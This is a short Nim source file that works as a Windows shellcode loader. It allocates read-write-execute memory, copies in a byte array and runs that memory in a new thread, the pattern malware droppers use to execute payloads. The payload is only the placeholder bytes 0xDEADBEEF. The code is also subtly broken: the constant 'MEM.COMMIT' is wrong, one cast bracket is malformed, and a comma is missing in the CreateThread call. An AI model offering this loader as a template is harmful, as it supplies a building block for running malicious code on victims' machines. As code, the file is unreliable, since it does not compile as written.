import winim

var shellcode: array[4, byte] = [0xDE, 0xAD, 0xBE, 0xEF]

var address = VirtualAlloc( NULL,
                            cast[SIZE_T](shellcode.len),
                            MEM.COMMIT,
                            PAGE_EXECUTE_READWRITE,
                            )

copyMem(address, addr(shellcode), cast[SIZE_T(shellcode.len)])

var thread_handle = CreateThread(NULL,
                                0,
                                cast[LPTHREAD_START_ROUTINE](address)
                                NULL,
                                0,
                                NULL
                                )

WaitForSingleObject(thread_handle, -1)
CloseHandle(thread_handle)
